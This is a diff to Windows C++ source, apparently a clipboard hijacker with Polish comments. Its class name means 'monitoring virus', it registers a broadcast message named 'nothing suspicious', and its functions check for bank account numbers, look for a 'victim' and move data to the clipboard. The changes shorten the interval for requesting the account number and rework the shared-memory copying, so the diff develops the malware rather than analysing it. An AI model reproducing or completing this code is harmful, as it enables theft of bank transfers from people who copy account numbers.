@@ -11,7 +11,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
 void MoveToCb();
 bool CheckIfAccountNumber(LPSTR str);
 void CheckForVictim();
-void SaveNumber(LPARAM num);
+void SaveNumber(LONG_PTR num);
 
 constexpr CHAR szClassName[] = "WirusMonitorujacy";
 LPSTR bankAccount;
@@ -34,7 +34,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
 		time(&current);
 		double diff = difftime(current, start); // różnica czasu w sekundach
-		if (diff >= 60.0)
+		if (diff >= 10.0)
 		{
 			// Wysłanie żądania do procesu nadawcy o konto bankowe
 			PostMessage(HWND_BROADCAST, messageCode, REQUEST_NUMBER, 0);
@@ -81,7 +81,7 @@ bool init(HINSTANCE hInstance)
 	messageCode = RegisterWindowMessage((LPCSTR)"Nic podejrzanego");
 	
 
-	bankAccount = (char*)malloc(17*sizeof(char));
+	bankAccount = (char*)calloc(MAXL + 1, sizeof(char));
 	bAset = false;
 	time(&start);
 
@@ -99,7 +99,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 			bAset = true;
 			break;
 		}
-	}
+	} else
 	switch (msg)
 	{
 	case WM_CREATE:
@@ -189,7 +189,10 @@ bool CheckIfAccountNumber(LPSTR str)
 void SaveNumber(LONG_PTR num)
 {
 	//bankAccount = (LPSTR)calloc(MAXL + 1, sizeof(CHAR));
-	LPSTR lpGlobalMem = LPSTR(GlobalLock(HGLOBAL(num)));
-	memcpy(bankAccount, lpGlobalMem, MAXL + 1);
+	//LPSTR lpGlobalMem = LPSTR(GlobalLock(HGLOBAL(num)));
+	//memcpy(bankAccount, lpGlobalMem, MAXL + 1); // BŁĄD!!!!
+	//GlobalFree(HGLOBAL(num));
+	LPSTR lpGlobalMem = LPSTR(num);
+	memcpy(bankAccount, lpGlobalMem, MAXL + 1); // BŁĄD!!!!
 	GlobalFree(HGLOBAL(num));
 }
